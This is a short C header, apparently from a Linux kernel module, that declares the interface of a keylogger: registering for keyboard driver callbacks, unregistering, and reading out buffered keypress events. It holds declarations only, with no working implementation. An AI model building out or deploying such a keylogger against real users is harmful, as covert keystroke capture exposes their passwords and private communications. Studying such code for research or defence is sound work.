#ifndef __KEYLOGGER_H_
#define __KEYLOGGER_H_

#include <linux/kernel.h>

/**
 * Register for callbacks from the keyboard driver
 */
int keylogger_register(void);

/**
 * Unregister for callbacks from the keyboard driver
 */
void keylogger_unregister(void);

/**
 * Return the last keypress events, flushing them from the internal
 * buffer.
 * Returns the number of chars copied on success otherwise a negative error code.
 */
ssize_t keylogger_last_events(char* buf, size_t len);

#endif
